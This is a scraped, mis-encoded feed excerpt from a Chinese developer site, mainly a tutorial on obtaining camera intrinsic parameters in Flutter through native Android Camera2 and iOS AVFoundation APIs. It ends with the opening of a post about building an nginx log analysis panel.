<p>2.RocketMQé«˜æ€§èƒ½æ­ç§˜ï¼šæ‰¿è½½ä¸‡äº¿çº§æµé‡çš„æ¶æ„å¥¥ç§˜ï½œå¾—ç‰©æŠ€æœ¯Â </p>
<p>3.PAGåœ¨å¾—ç‰©ç¤¾åŒºSçº§æ´»åŠ¨çš„è½åœ°</p>
<p>4.Ant Design 6.0 å°é²œï¼šä¸Šæ‰‹ç°ä»£åŒ–ç»„ä»¶å¼€å‘ï½œå¾—ç‰©æŠ€æœ¯</p>
<p>5.Java è®¾è®¡æ¨¡å¼ï¼šåŸç†ã€æ¡†æ¶åº”ç”¨ä¸å®æˆ˜å…¨è§£æï½œå¾—ç‰©æŠ€æœ¯</p>
<h3 data-id="heading-13">æ–‡ /å—é£</h3>
<p>å…³æ³¨å¾—ç‰©æŠ€æœ¯ï¼Œæ¯å‘¨æ›´æ–°æŠ€æœ¯å¹²è´§</p>
<p>è¦æ˜¯è§‰å¾—æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©çš„è¯ï¼Œæ¬¢è¿è¯„è®ºè½¬å‘ç‚¹èµï½</p>
<p>æœªç»å¾—ç‰©æŠ€æœ¯è®¸å¯ä¸¥ç¦è½¬è½½ï¼Œå¦åˆ™ä¾æ³•è¿½ç©¶æ³•å¾‹è´£ä»»ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutterç§»åŠ¨ç«¯è·å–ç›¸æœºå†…å‚]]></title>    <link>https://juejin.cn/post/7592550891540463635</link>    <guid>https://juejin.cn/post/7592550891540463635</guid>    <pubDate>2026-01-08T07:11:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592550891540463635" data-draft-id="7592508079307063315" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutterç§»åŠ¨ç«¯è·å–ç›¸æœºå†…å‚"/> <meta itemprop="keywords" content="å‰ç«¯,Flutter"/> <meta itemprop="datePublished" content="2026-01-08T07:11:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å‚…é‡Œå¶"/> <meta itemprop="url" content="https://juejin.cn/user/805267400309469"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutterç§»åŠ¨ç«¯è·å–ç›¸æœºå†…å‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/805267400309469/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å‚…é‡Œå¶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:11:51.000Z" title="Thu Jan 08 2026 07:11:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Flutter App ä¸­ç›¸æœºå†…å‚è·å–å…¨æµç¨‹</h2>
<blockquote>
<p><strong>ä¸€å¥è¯æ€»ç»“</strong><br/>
Flutter æœ¬èº«æ— æ³•æ‹¿åˆ°â€œçœŸå®ç›¸æœºå†…å‚â€ï¼Œå¿…é¡»é€šè¿‡ <strong>åŸç”Ÿ Android / iOS API</strong> è·å–ï¼Œç„¶åå›ä¼ ç»™ Flutterã€‚<br/>
âš ï¸ ä¸åŒåˆ†è¾¨ç‡ã€ä¸åŒæ‘„åƒå¤´ã€ä¸åŒå¯¹ç„¦çŠ¶æ€ï¼Œå†…å‚éƒ½ä¼šä¸åŒï¼Œéœ€è¦åŠ¨æ€è·å–æˆ–æŒ‰æ¯”ä¾‹è°ƒæ•´ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-1">1. ä»€ä¹ˆæ˜¯ç›¸æœºå†…å‚</h3>
<p>è§†è§‰é‡Œå¸¸ç”¨çš„å†…å‚çŸ©é˜µ (K)ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7708371ce45d4f4e8a7599fbf1376e6f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YKF6YeM5Y-2:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768461111&amp;x-signature=MnIJslh5N8zDyirzWQav8cDieKU%3D" alt="image.png" loading="lazy"/></p>





















<table><thead><tr><th>å‚æ•°</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>fx, fy</td><td>ç„¦è·ï¼ˆåƒç´ å•ä½ï¼‰</td></tr><tr><td>cx, cy</td><td>ä¸»ç‚¹ï¼ˆé€šå¸¸åœ¨å›¾åƒä¸­å¿ƒé™„è¿‘ï¼‰</td></tr><tr><td>skew</td><td>ä¸€èˆ¬ä¸º 0</td></tr></tbody></table>
<blockquote>
<p>å·¥ç¨‹å®è·µä¸­ï¼ŒåŸºæœ¬å…³æ³¨ fx, fy, cx, cy å³å¯ã€‚</p>
</blockquote>
<hr/>
<h3 data-id="heading-2">2. Flutter å±‚è°ƒç”¨æ–¹æ³•</h3>
<p>Flutter ç«¯é€šè¿‡ <strong>MethodChannel</strong> è°ƒç”¨åŸç”Ÿæ¥å£ã€‚</p>
<h4 data-id="heading-3">æ–¹å¼ Aï¼šè¯¦ç»†ç‰ˆæœ¬ï¼ˆç”¨äºä¸Šä¼  / å±•ç¤ºï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">static const MethodChannel <span class="hljs-attr">_channel</span> = MethodChannel(<span class="hljs-string">'camera_intrinsics_detailed'</span>)<span class="hljs-comment">;</span>

Future&lt;CameraIntrinsicsResult?&gt; fetchCameraIntrinsics() async {
  final <span class="hljs-attr">result</span> = await _channel.invokeMethod(<span class="hljs-string">'getCameraIntrinsicsDetailed'</span>)<span class="hljs-comment">;</span>
  // è§£æ fx, fy, cx, cy, method, errorMargin
}
</code></pre>
<h4 data-id="heading-4">æ–¹å¼ Bï¼šç®€å•ç‰ˆæœ¬ï¼ˆä»…ç”¨äºæ–‡ä»¶å / ç®€å•ç”¨é€”ï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">static const MethodChannel <span class="hljs-attr">_channel</span> = MethodChannel(<span class="hljs-string">'camera_intrinsics'</span>)<span class="hljs-comment">;</span>

Future&lt;CameraIntrinsics?&gt; getCameraIntrinsics() async {
  final <span class="hljs-attr">result</span> = await _channel.invokeMethod(<span class="hljs-string">'getCameraIntrinsics'</span>)<span class="hljs-comment">;</span>
  // åªè¿”å› fx, fy, cx, cy
}
</code></pre>
<hr/>
<h3 data-id="heading-5">3. Android åŸç”Ÿå®ç°ï¼ˆCamera2 APIï¼‰</h3>
<h4 data-id="heading-6">1ï¸âƒ£ é€‰æ‹©æ‘„åƒå¤´ï¼ˆä¼˜å…ˆåç½®ï¼‰</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">val</span> cameraManager = getSystemService(CAMERA_SERVICE) <span class="hljs-keyword">as</span> CameraManager
<span class="hljs-keyword">val</span> cameraIds = cameraManager.cameraIdList

<span class="hljs-keyword">var</span> targetCameraId: String? = <span class="hljs-literal">null</span>
<span class="hljs-keyword">for</span> (id <span class="hljs-keyword">in</span> cameraIds) {
    <span class="hljs-keyword">val</span> characteristics = cameraManager.getCameraCharacteristics(id)
    <span class="hljs-keyword">if</span> (characteristics.<span class="hljs-keyword">get</span>(CameraCharacteristics.LENS_FACING) ==
        CameraCharacteristics.LENS_FACING_BACK) {
        targetCameraId = id
        <span class="hljs-keyword">break</span>
    }
}
</code></pre>
<h4 data-id="heading-7">2ï¸âƒ£ è·å–å†…å‚ï¼ˆä¼˜å…ˆç¡¬ä»¶æ ¡å‡†ï¼‰</h4>
<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">intrinsic</span> = characteristics.get(CameraCharacteristics.LENS_INTRINSIC_CALIBRATION)
val <span class="hljs-attr">fx</span> = intrinsic[<span class="hljs-number">0</span>].toDouble()
val <span class="hljs-attr">fy</span> = intrinsic[<span class="hljs-number">1</span>].toDouble()
val <span class="hljs-attr">cx</span> = intrinsic[<span class="hljs-number">2</span>].toDouble()
val <span class="hljs-attr">cy</span> = intrinsic[<span class="hljs-number">3</span>].toDouble()
</code></pre>
<ul>
<li>ç¡¬ä»¶æ ¡å‡†è¯¯å·®çº¦ 1%</li>
<li>è‹¥è·å–å¤±è´¥ï¼Œå¯ç”¨ä¼ æ„Ÿå™¨å‚æ•°è®¡ç®—ï¼š</li>
</ul>

<pre><code class="hljs language-ini" lang="ini">val <span class="hljs-attr">sensorSize</span> = characteristics.get(CameraCharacteristics.SENSOR_INFO_PHYSICAL_SIZE)
val <span class="hljs-attr">pixelArray</span> = characteristics.get(CameraCharacteristics.SENSOR_INFO_PIXEL_ARRAY_SIZE)
val <span class="hljs-attr">focalLength</span> = characteristics.get(CameraCharacteristics.LENS_INFO_AVAILABLE_FOCAL_LENGTHS)[<span class="hljs-number">0</span>]

val <span class="hljs-attr">fx</span> = focalLength * pixelArray.width / sensorSize.width
val <span class="hljs-attr">fy</span> = focalLength * pixelArray.height / sensorSize.height
val <span class="hljs-attr">cx</span> = pixelArray.width / <span class="hljs-number">2.0</span>
val <span class="hljs-attr">cy</span> = pixelArray.height / <span class="hljs-number">2.0</span>
</code></pre>
<blockquote>
<p>è®¡ç®—å€¼è¯¯å·®çº¦ 5%ï¼Œ90% åœºæ™¯å¤Ÿç”¨ã€‚</p>
</blockquote>
<h4 data-id="heading-8">âš ï¸ æ³¨æ„å‘ç‚¹</h4>
<ol>
<li>åˆ†è¾¨ç‡å˜åŒ–æ—¶éœ€è¦é‡ç®— fx/fy</li>
<li>å‰åæ‘„åƒå¤´å†…å‚ä¸åŒ</li>
<li>CameraX é»˜è®¤éšè—å†…å‚ï¼Œéœ€è¦ Camera2Interop</li>
</ol>
<hr/>
<h3 data-id="heading-9">4. iOS åŸç”Ÿå®ç°ï¼ˆAVFoundationï¼‰</h3>
<h4 data-id="heading-10">1ï¸âƒ£ è·å–æ‘„åƒå¤´å’Œ activeFormat</h4>
<pre><code class="hljs language-ini" lang="ini">guard let <span class="hljs-attr">camera</span> = AVCaptureDevice.default(.builtInWideAngleCamera, for: .video, position: .back) else { return }
let <span class="hljs-attr">format</span> = camera.activeFormat
let <span class="hljs-attr">dimensions</span> = CMVideoFormatDescriptionGetDimensions(format.formatDescription)
let <span class="hljs-attr">width</span> = Double(dimensions.width)
let <span class="hljs-attr">height</span> = Double(dimensions.height)
</code></pre>
<h4 data-id="heading-11">2ï¸âƒ£ è·å–å†…å‚ï¼ˆæ¨èé¡ºåºï¼‰</h4>
<h5 data-id="heading-12">æ–¹æ³•1ï¼šCameraCalibrationDataï¼ˆæœ€å‡†ç¡®ï¼ŒARKit/TrueDepth æ”¯æŒï¼‰</h5>
<pre><code class="hljs language-ini" lang="ini">if let <span class="hljs-attr">intrinsic</span> = camera.cameraCalibrationData?.intrinsicMatrix {
    let <span class="hljs-attr">fx</span> = intrinsic.columns.<span class="hljs-number">0</span>.x
    let <span class="hljs-attr">fy</span> = intrinsic.columns.<span class="hljs-number">1</span>.y
    let <span class="hljs-attr">cx</span> = intrinsic.columns.<span class="hljs-number">2</span>.x
    let <span class="hljs-attr">cy</span> = intrinsic.columns.<span class="hljs-number">2</span>.y
}
</code></pre>
<h5 data-id="heading-13">æ–¹æ³•2ï¼šFOVè®¡ç®—ï¼ˆä¼°ç®—ï¼‰</h5>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">fovXRadians</span> = camera.activeFormat.videoFieldOfView * .pi / <span class="hljs-number">180</span>
let <span class="hljs-attr">fx</span> = width / (<span class="hljs-number">2</span> * tan(fovXRadians/<span class="hljs-number">2</span>))
let <span class="hljs-attr">fy</span> = fx * height / width
let <span class="hljs-attr">cx</span> = width / <span class="hljs-number">2</span>
let <span class="hljs-attr">cy</span> = height / <span class="hljs-number">2</span>
</code></pre>
<h5 data-id="heading-14">æ–¹æ³•3ï¼šç»éªŒå€¼ä¼°ç®—ï¼ˆç²—ç•¥ï¼‰</h5>
<pre><code class="hljs language-ini" lang="ini">let <span class="hljs-attr">fx</span> = width * <span class="hljs-number">1.2</span>
let <span class="hljs-attr">fy</span> = height * <span class="hljs-number">1.2</span>
let <span class="hljs-attr">cx</span> = width / <span class="hljs-number">2</span>
let <span class="hljs-attr">cy</span> = height / <span class="hljs-number">2</span>
</code></pre>
<hr/>
<h3 data-id="heading-15">5. Flutter è°ƒç”¨é“¾æ€»ç»“</h3>
<pre><code class="hljs language-scss" lang="scss">ç”¨æˆ·æ“ä½œ / é¡µé¢å¯åŠ¨
    â”‚
    â”œâ”€&gt; Flutter å±‚è°ƒç”¨ <span class="hljs-built_in">fetchCameraIntrinsics</span>()
    â”‚   â””â”€&gt; MethodChannel
    â”‚       â”œâ”€&gt; Android: Camera2 API
    â”‚       â””â”€&gt; iOS: AVCaptureDevice + CameraCalibrationData / FOV
    â”‚
    â””â”€&gt; è¿”å› fx, fy, cx, cyï¼Œå­˜å‚¨åˆ° SharedPreferences / æœ¬åœ°ç¼“å­˜
</code></pre>
<hr/>
<h3 data-id="heading-16">6. å·¥ç¨‹å®ç”¨ç»éªŒ</h3>
<ol>
<li>
<p><strong>ä¸åŒåˆ†è¾¨ç‡</strong>ï¼šå†…å‚æŒ‰æ¯”ä¾‹ç¼©æ”¾</p>
</li>
<li>
<p><strong>ä¸åŒæ‘„åƒå¤´</strong>ï¼šå‰åæ‘„åƒå¤´å†…å‚ä¸åŒ</p>
</li>
<li>
<p><strong>Flutter ç«¯</strong>ï¼šåªåšå­˜å‚¨ã€è®¡ç®—ã€æŠ•å½±ï¼Œæ ¸å¿ƒè·å–ä¾èµ–åŸç”Ÿ</p>
</li>
<li>
<p><strong>åŸå‹é˜¶æ®µ / OpenCV ç®—æ³•</strong>ï¼šå¯ç”¨è¿‘ä¼¼å€¼</p>
<pre><code class="hljs language-scss" lang="scss">fx â‰ˆ fy â‰ˆ <span class="hljs-built_in">max</span>(imageWidth, imageHeight)
cx â‰ˆ imageWidth / <span class="hljs-number">2</span>
cy â‰ˆ imageHeight / <span class="hljs-number">2</span>
</code></pre>
</li>
</ol>
<hr/>
<h3 data-id="heading-17">7. æ€»ç»“</h3>
<ul>
<li>Flutter æœ¬èº«æ— æ³•ç›´æ¥è·å–ç›¸æœºå†…å‚</li>
<li>Android ç”¨ <strong>Camera2 API / LENS_INTRINSIC_CALIBRATION</strong></li>
<li>iOS ç”¨ <strong>CameraCalibrationData / activeFormat / FOV</strong></li>
<li>å®é™…ä½¿ç”¨æ—¶éœ€è€ƒè™‘åˆ†è¾¨ç‡ã€æ‘„åƒå¤´ã€å¯¹ç„¦çŠ¶æ€</li>
<li>å·¥ç¨‹ä¸Šå¯å…ˆç”¨è¿‘ä¼¼å€¼è·‘ç®—æ³•ï¼ŒåæœŸæŒ‰è®¾å¤‡ç²¾ç¡®è·å–</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¼€å‘äº†ä¸€ä¸ªnginxæ—¥å¿—åˆ†æé¢æ¿]]></title>    <link>https://juejin.cn/post/7592789801708093481</link>    <guid>https://juejin.cn/post/7592789801708093481</guid>    <pubDate>2026-01-08T07:21:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592789801708093481" data-draft-id="7592572266754015295" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¼€å‘äº†ä¸€ä¸ªnginxæ—¥å¿—åˆ†æé¢æ¿"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-08T07:21:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¥å¥‡çš„ç¨‹åºå‘˜"/> <meta itemprop="url" content="https://juejin.cn/user/3984285870859614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¼€å‘äº†ä¸€ä¸ªnginxæ—¥å¿—åˆ†æé¢æ¿
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3984285870859614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¥å¥‡çš„ç¨‹åºå‘˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T07:21:46.000Z" title="Thu Jan 08 2026 07:21:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>æœ€è¿‘åœ¨ä¼˜åŒ–ç½‘ç«™è®¿é—®é“¾è·¯çš„è¿‡ç¨‹ä¸­ï¼Œéƒ¨ç½²äº†ä¸€å¥—WAFé˜²ç«å¢™ï¼Œå®ƒå¤§éƒ¨åˆ†åŠŸèƒ½éƒ½åšçš„æŒºå¥½ï¼Œç¾ä¸­ä¸è¶³çš„åœ°æ–¹å°±æ˜¯é’ˆå¯¹äºç½‘ç«™è®¿å®¢çš„ç›¸å…³åŠŸèƒ½éœ€è¦ä»˜è´¹ï¼ˆ3600å…ƒ/å¹´ï¼‰æ‰èƒ½ç”¨ã€‚</p>
<p>ä»˜è´¹æ˜¯ä¸å¯èƒ½ä»˜è´¹çš„ï¼Œæ‰¾äº†ä¸€åœˆnginxæ—¥å¿—åˆ†æçš„å¼€æºé¡¹ç›®ï¼Œå¤§éƒ¨åˆ†éƒ½åšçš„æŒºç®€é™‹çš„ï¼Œè¦ä¹ˆå°±æ˜¯åšçš„å¾ˆé‡ï¼Œéœ€è¦éƒ¨ç½²å…¶ä»–æœåŠ¡ã€‚</p>
